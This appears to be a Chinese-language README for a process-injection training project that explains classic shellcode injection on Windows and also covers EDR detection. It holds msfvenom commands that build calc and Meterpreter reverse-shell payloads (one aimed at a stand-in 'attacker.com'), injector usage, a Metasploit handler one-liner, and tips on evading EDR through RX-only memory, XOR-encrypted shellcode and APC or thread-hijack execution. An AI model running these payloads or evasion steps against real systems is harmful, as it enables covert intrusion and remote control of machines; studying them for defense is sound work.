# Classic Shellcode Injection

## 概述

**Classic Shellcode Injection** 是最基础的 shellcode 注入技术，直接向目标进程注入机器码（shellcode）并执行。

**原始项目**: [plackyhacker/Shellcode-Injection-Techniques](https://github.com/plackyhacker/Shellcode-Injection-Techniques)

**MITRE ATT&CK**: [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/)

## Shellcode Injection vs DLL Injection

### 对比表

| 特性 | DLL Injection (#12) | Shellcode Injection (#13) |
|------|-------------------|-------------------------|
| **注入内容** | DLL 路径字符串 | 原始机器码（shellcode） |
| **执行方式** | LoadLibrary 加载 DLL | 直接执行机器码 |
| **线程入口点** | LoadLibrary 函数 | Shellcode 起始地址 |
| **线程参数** | DLL 路径指针 | NULL（或自定义） |
| **可见性** | 模块列表可见 | 不在模块列表 |
| **依赖** | 需要 DLL 文件 | 无文件依赖 |
| **大小** | DLL 可能几 MB | Shellcode 通常几 KB |
| **灵活性** | 受 DLL 格式限制 | 完全灵活 |
| **检测难度** | 中 | 高 |

### 技术流程对比

**DLL Injection**:
```c
DLL 路径: "C:\\evil.dll"
    ↓ WriteProcessMemory
远程进程内存: "C:\\evil.dll"
    ↓ CreateRemoteThread(LoadLibrary, dllPathAddr)
LoadLibrary("C:\\evil.dll")
    ↓
Windows 加载 DLL
    ↓
DllMain 执行
```

**Shellcode Injection**:
```c
Shellcode: \xFC\x48\x83\xE4...
    ↓ WriteProcessMemory
远程进程内存: \xFC\x48\x83\xE4...
    ↓ CreateRemoteThread(shellcodeAddr, NULL)
直接执行机器码
    ↓
Shellcode 执行
```

## 技术原理

### 核心流程

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. 读取 Shellcode 文件                                          │
│    ReadShellcodeFile("calc_shellcode.bin", &shellcode, &size)   │
│    → 从文件加载原始字节                                         │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. 打开目标进程                                                 │
│    OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | ...) │
│    → 获取进程句柄 (hProcess)                                    │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. 分配远程内存（RWX 权限）                                     │
│    VirtualAllocEx(hProcess, NULL, size, ..., PAGE_EXECUTE_READWRITE) │
│    → 可读、可写、可执行                                         │
│    → 返回远程地址 (pRemoteAddr)                                 │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. 写入 Shellcode                                               │
│    WriteProcessMemory(hProcess, pRemoteAddr, shellcode, size)   │
│    → 原始机器码复制到远程进程                                   │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. 创建远程线程执行 Shellcode                                   │
│    CreateRemoteThread(hProcess, ..., pRemoteAddr, NULL, ...)    │
│    → 入口点 = shellcode 地址                                    │
│    → 参数 = NULL（shellcode 自包含）                            │
│    → CPU 开始执行机器码                                         │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. Shellcode 执行                                               │
│    → 可能是 meterpreter reverse shell                           │
│    → 可能是 calc.exe 启动                                       │
│    → 可能是任意自定义代码                                       │
└─────────────────────────────────────────────────────────────────┘
```

## 关键技术细节

### 1. 为什么需要 PAGE_EXECUTE_READWRITE？

**DLL Injection**:
```c
// DLL 路径是数据，只需要 PAGE_READWRITE
VirtualAllocEx(..., PAGE_READWRITE);
WriteProcessMemory(..., "C:\\evil.dll", ...);
```

**Shellcode Injection**:
```c
// Shellcode 是代码，需要执行权限
VirtualAllocEx(..., PAGE_EXECUTE_READWRITE);  // RWX
WriteProcessMemory(..., \xFC\x48\x83..., ...);

// CPU 需要执行这些字节
CreateRemoteThread(..., shellcodeAddr, ...);
```

**内存权限**:
- **R (Read)**: 读取数据
- **W (Write)**: 写入数据
- **X (Execute)**: 执行代码

**RWX = 高度可疑**:
- 正常内存要么 RW（数据），要么 RX（代码）
- RWX 意味着"可修改的代码"
- EDR 重点监控 RWX 内存分配

### 2. Shellcode 是什么？

**定义**: Shellcode 是自包含的机器码片段，可以独立执行。

**特点**:
- 无需 PE 头部
- 无需导入表（IAT）
- 无需重定位
- 位置无关代码（PIC）

**示例 - ExitThread(0) Shellcode**:
```asm
; x64 Assembly
xor rcx, rcx        ; 参数 = 0
mov rax, ExitThread ; 函数地址
call rax            ; 调用

; 机器码
0x48, 0x31, 0xC9,   ; xor rcx, rcx
0x48, 0xB8, ...     ; mov rax, ...
0xFF, 0xD0          ; call rax
```

### 3. Shellcode 如何解决依赖问题？

**问题**: 如何调用 Windows API（如 LoadLibrary, GetProcAddress）？

**方案 1: 硬编码地址（不可移植）**:
```asm
mov rax, 0x7FFF12345678  ; MessageBoxA 地址（固定）
call rax
```

**方案 2: 动态解析（推荐）**:
```asm
; 1. 通过 PEB 找到 kernel32.dll
mov rax, gs:[0x60]          ; PEB 地址
mov rax, [rax + 0x18]       ; PEB->Ldr
mov rax, [rax + 0x20]       ; InLoadOrderModuleList

; 2. 遍历模块列表找到 kernel32.dll
; 3. 解析导出表获取 GetProcAddress
; 4. 使用 GetProcAddress 获取其他函数地址
```

**msfvenom 生成的 shellcode** 自动包含这些解析代码！

### 4. Shellcode 类型

**Staged Shellcode（分段）**:
```
小型 Stager (100-300 bytes)
    ↓ 下载
完整 Payload (10KB+)
```
- **优点**: 初始 shellcode 小，绕过大小限制
- **缺点**: 需要网络连接

**Stageless Shellcode（单段）**:
```
完整 Payload (包含所有功能)
```
- **优点**: 无需网络，独立执行
- **缺点**: 体积大

### 5. Position Independent Code (PIC)

**问题**: Shellcode 可能被加载到任意地址，如何确保能执行？

**解决方案**: 位置无关代码

```asm
; 错误示例（地址硬编码）
mov rax, 0x140001234  ; 假定 shellcode 在 0x140000000
call rax

; 正确示例（相对寻址）
call get_rip
get_rip:
pop rax               ; rax = 当前 RIP
add rax, offset       ; 计算相对偏移
```

**msfvenom 默认生成 PIC shellcode**。

## 生成 Shellcode

### 使用 msfvenom

**安装**:
```bash
# Kali Linux / Parrot OS
apt install metasploit-framework

# macOS
brew install metasploit

# 或使用 Docker
docker run --rm -it metasploitframework/metasploit-framework msfvenom
```

**生成 calc.exe Shellcode**:
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f c
```

输出:
```c
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
...
"\x63\x61\x6c\x63\x00";  // "calc\0"
```

**生成 MessageBox Shellcode**:
```bash
msfvenom -p windows/x64/messagebox \
    TEXT="Shellcode Injected!" \
    TITLE="Success" \
    -f c
```

**生成 Meterpreter Reverse Shell**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=4444 \
    -f raw -o meterpreter.bin
```

**保存为二进制文件**:
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc_shellcode.bin
```

### Shellcode 编码器

**绕过坏字符**:
```bash
# 避免 null bytes (0x00)
msfvenom -p windows/x64/exec CMD=calc.exe \
    -b '\x00' \
    -f c
```

**多重编码**:
```bash
msfvenom -p windows/x64/exec CMD=calc.exe \
    -e x64/xor \
    -i 3 \
    -f c
```

## 项目结构

```
13-shellcode-injection/
├── README.md                     # 本文档
├── build.bat                     # Windows 构建脚本
├── build.sh                      # Linux/macOS 构建脚本
├── src/
│   ├── shellcode_injection.c     # 主注入器（360 行）
│   └── generate_shellcode.c      # Shellcode 生成器（180 行）
└── build/
    ├── shellcode_injection.exe   # 注入器（21KB）
    ├── generate_shellcode.exe    # 生成器（19KB）
    └── calc_shellcode.bin        # 测试 shellcode（272 bytes）
```

## 构建和使用

### 前置要求

- **编译器**: GCC (MinGW-w64)
- **架构**: x64
- **系统**: Windows 7+
- **权限**: 注入 System 进程需要管理员权限
- **Shellcode 生成**: msfvenom (可选)

### 构建步骤

```bash
# Windows
build.bat

# Linux/macOS (需要 MinGW 交叉编译)
bash build.sh
```

### 使用方法

```bash
cd build

# ===== 生成 Shellcode =====
# 使用内置生成器（calc.exe）
generate_shellcode.exe calc

# 或使用 msfvenom（推荐）
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc_shellcode.bin

# ===== 注入到现有进程 =====
shellcode_injection.exe <PID> <shellcode.bin>

# 示例：注入到 PID 1234
shellcode_injection.exe 1234 calc_shellcode.bin

# ===== 注入到新进程 =====
shellcode_injection.exe <EXE路径> <shellcode.bin>

# 示例：启动 notepad 并注入
shellcode_injection.exe "C:\Windows\System32\notepad.exe" calc_shellcode.bin
```

### 输出示例

**注入到现有进程**:
```
===================================================================
Classic Shellcode Injection
Based on: plackyhacker/Shellcode-Injection-Techniques
===================================================================

[+] Debug 权限已获取

===================================================================
Classic Shellcode Injection - 注入到现有进程
===================================================================

[*] 目标 PID: 1234
[*] Shellcode 文件: calc_shellcode.bin
[+] Shellcode 已加载: 272 bytes
[+] 进程已打开
[+] 架构兼容
[*] Shellcode 大小: 272 bytes

[*] 步骤 1: 在目标进程分配内存...
[+] VirtualAllocEx() 成功，地址: 0x000002A4B2F0000

[*] 步骤 2: 写入 shellcode...
[+] WriteProcessMemory() 成功，写入: 272 bytes

[*] 步骤 3: 创建远程线程执行 shellcode...
[+] CreateRemoteThread() 成功，线程句柄: 0x000000000000042C
[*] 等待 shellcode 执行...
[+] Shellcode 执行完成，退出码: 0x0

===================================================================
[+] Shellcode Injection 完成！
===================================================================
```

**如果注入的是 calc.exe shellcode，此时会看到计算器启动！**

## 技术限制

### 1. RWX 内存高度可疑

**问题**: `PAGE_EXECUTE_READWRITE` 是 EDR 监控重点

```c
VirtualAllocEx(..., PAGE_EXECUTE_READWRITE);  // ← 告警！
```

**检测**:
```c
// EDR 可能立即检测
if (protection == PAGE_EXECUTE_READWRITE) {
    Alert("Suspicious RWX memory allocation!");
}
```

**缓解**:
```c
// 分阶段修改权限
VirtualAllocEx(..., PAGE_READWRITE);  // 先 RW
WriteProcessMemory(..., shellcode, ...);
VirtualProtectEx(..., PAGE_EXECUTE_READ);  // 再改为 RX
CreateRemoteThread(...);
```

### 2. 架构限制

与 DLL Injection 相同：
- 32位注入器 ❌ 64位进程
- 64位注入器 ❌ 32位进程

**解决方案**: 准备两个版本的注入器和 shellcode

### 3. Shellcode 兼容性

**问题**: Shellcode 可能包含坏字符

```c
// 某些注入场景不允许 null bytes
unsigned char shellcode[] = "\x00\x01\x02";  // ← 0x00 可能截断
```

**解决方案**:
```bash
# 编码避免坏字符
msfvenom -p windows/x64/exec CMD=calc.exe \
    -b '\x00\x0a\x0d' \  # 避免 null, LF, CR
    -f c
```

### 4. Shellcode 大小

**VirtualAllocEx 最小分配**: 通常 4KB（一页）

即使 shellcode 只有 100 bytes，也会分配 4096 bytes。

### 5. 长时间运行的 Shellcode

**Meterpreter 等持久化 shellcode**:
- 不会退出
- `WaitForSingleObject` 会超时
- 这是正常的！

```c
WaitForSingleObject(hThread, 10000);  // 10秒后超时
// 但 Meterpreter 仍在运行
```

## 检测与防御

### 检测方法

**1. RWX 内存监控**
```c
// 扫描所有进程的内存区域
for (each region in process) {
    if (region.Protection == PAGE_EXECUTE_READWRITE) {
        if (!IsInModuleRange(region.BaseAddress)) {
            Alert("Suspicious RWX memory outside modules!");
        }
    }
}
```

**2. CreateRemoteThread 监控**
```c
// Hook CreateRemoteThread
HANDLE WINAPI Hooked_CreateRemoteThread(...) {
    DWORD targetPid = GetProcessId(hProcess);
    DWORD callerPid = GetCurrentProcessId();

    if (targetPid != callerPid) {
        // 跨进程线程创建
        if (!IsStartAddress_InModule(lpStartAddress)) {
            Alert("Remote thread with non-module entry point!");
            // lpStartAddress 指向分配的内存，不在任何模块
        }
    }
    return Real_CreateRemoteThread(...);
}
```

**3. 内存模式匹配**
```c
// 扫描可执行内存寻找已知 shellcode 特征
if (memcmp(mem, "\xfc\x48\x83\xe4\xf0", 5) == 0) {
    Alert("Meterpreter shellcode signature detected!");
}
```

**4. 行为分析**
```
序列检测：
进程 A:
  OpenProcess(进程 B)
    ↓
  VirtualAllocEx(进程 B, PAGE_EXECUTE_READWRITE)  ← 可疑
    ↓
  WriteProcessMemory(进程 B)
    ↓
  CreateRemoteThread(进程 B, 非模块地址)  ← 高度可疑
    ↓
  → 告警: Classic Shellcode Injection
```

### 防御建议

**对于 EDR/AV**:
- 监控 RWX 内存分配
- Hook CreateRemoteThread
- 扫描可执行内存的 shellcode 签名
- 检测远程线程入口点合法性
- 监控可疑 API 调用序列

**对于管理员**:
- 使用 Windows Defender Exploit Guard
- 启用 CFG (Control Flow Guard)
- 使用 Protected Process
- 限制跨进程权限

**对于开发者**:
- 实施进程完整性检查
```c
// 定期扫描自己的内存
for (each memory region) {
    if (Protection == PAGE_EXECUTE_READWRITE) {
        if (!IsMyCode(region)) {
            TerminateProcess(GetCurrentProcess(), 0);
        }
    }
}
```

## 进阶技术

### 1. 避免 RWX - W^X 原则

**Write XOR Execute**: 内存要么可写，要么可执行，不能同时

```c
// 步骤 1: 分配 RW
LPVOID mem = VirtualAllocEx(hProcess, NULL, size,
                            MEM_COMMIT, PAGE_READWRITE);

// 步骤 2: 写入 shellcode
WriteProcessMemory(hProcess, mem, shellcode, size, NULL);

// 步骤 3: 改为 RX（不可写了）
DWORD oldProtect;
VirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, &oldProtect);

// 步骤 4: 执行
CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL);
```

**优势**: 避免 RWX，更隐蔽

### 2. 使用 Code Cave

**Code Cave**: 程序内存中未使用的空间

```c
// 不分配新内存，使用现有模块的空隙
LPVOID codeCave = FindCodeCave(hProcess, shellcodeSize);
WriteProcessMemory(hProcess, codeCave, shellcode, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, codeCave, NULL, 0, NULL);
```

**优势**:
- 不调用 VirtualAllocEx
- Shellcode 位于合法模块内

**劣势**:
- Code cave 可能不够大
- 可能破坏原有代码

### 3. Shellcode 加密

**绕过签名检测**:

```c
// 加密 shellcode
unsigned char encrypted[] = XOR_Encrypt(shellcode, key);

// 写入加密的 shellcode
WriteProcessMemory(hProcess, mem, encrypted, size, NULL);

// 注入解密 stub
unsigned char stub[] = {
    // for (i = 0; i < size; i++) mem[i] ^= key;
    // jmp mem
};
WriteProcessMemory(hProcess, mem2, stub, sizeof(stub), NULL);
CreateRemoteThread(hProcess, NULL, 0, mem2, NULL, 0, NULL);
```

### 4. 替代 CreateRemoteThread

**更隐蔽的执行方法**:

```c
// 方法 1: QueueUserAPC
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0);

// 方法 2: SetThreadContext (Thread Hijacking)
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)shellcodeAddr;
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);

// 方法 3: NtCreateThreadEx
pNtCreateThreadEx(..., shellcodeAddr, ...);
```

## 实战案例

### Cobalt Strike Beacon

**流程**:
```
1. Stage 0: 小型 stager shellcode (200 bytes)
    ↓ HTTP GET
2. Stage 1: 完整 Beacon DLL (100KB+)
    ↓ 反射式加载
3. Beacon 运行，建立 C2 连接
```

**注入方法**: Classic Shellcode Injection + 反射式 DLL

### Meterpreter

```bash
# 生成 reverse shell shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=attacker.com LPORT=4444 \
    -f raw -o meterpreter.bin

# 注入到目标进程
shellcode_injection.exe 1234 meterpreter.bin

# Metasploit 监听
msfconsole -q -x "use exploit/multi/handler; \
    set payload windows/x64/meterpreter/reverse_tcp; \
    set LHOST 0.0.0.0; set LPORT 4444; run"
```

### 游戏外挂

**注入 ESP/Aimbot shellcode**:
```
1. 找到游戏进程
2. 注入 hook shellcode
3. Shellcode hook DirectX/OpenGL 函数
4. 绘制 ESP 框
```

## 相关技术

- **[DLL Injection](../12-dll-injection/)** - 注入 DLL 而不是 shellcode
- **[Reflective DLL Injection](../14-reflective-dll/)** - 手动映射 DLL 到内存
- **[Thread Hijacking]** - 劫持现有线程执行 shellcode
- **[APC Injection]** - 使用 QueueUserAPC

## Credits

- **plackyhacker** - Shellcode-Injection-Techniques 项目作者
- **Metasploit Framework** - msfvenom shellcode 生成器

## 参考资料

### 技术文章
- [Shellcode-Injection-Techniques Repository](https://github.com/plackyhacker/Shellcode-Injection-Techniques)
- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/)
- [Writing Shellcode](https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/)

### Shellcode 生成
- [Metasploit msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Shellcode Compiler](https://github.com/NytroRST/ShellcodeCompiler)

## 免责声明

此代码仅用于教育和防御性安全研究目的。不得用于未经授权的系统访问或恶意活动。使用者需对自己的行为负责。
